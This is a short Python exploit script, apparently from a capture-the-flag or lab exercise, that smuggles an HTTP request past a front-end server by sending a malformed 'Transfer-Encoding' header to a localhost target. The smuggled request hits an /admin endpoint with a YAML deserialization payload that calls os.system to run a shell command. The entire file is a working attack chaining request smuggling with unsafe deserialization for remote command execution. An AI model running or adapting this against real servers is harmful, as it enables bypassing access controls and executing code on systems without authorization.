import requests


def smuggling(url, payload):
    headers = {
        "Transfer-Encoding": "\rchunked",
    }
    data = f"0\r\n\r\n{payload}\r\n"
    r = requests.post(url, headers=headers, data=data)
    return r.text, r.status_code


HOST = "http://localhost:8000"
res = smuggling(
    HOST,
    "GET /admin?data=!!python/object/apply:os.system ['ls'] HTTP/1.1\r\nHost: localhost\r\n\r\n",
)
print(res)
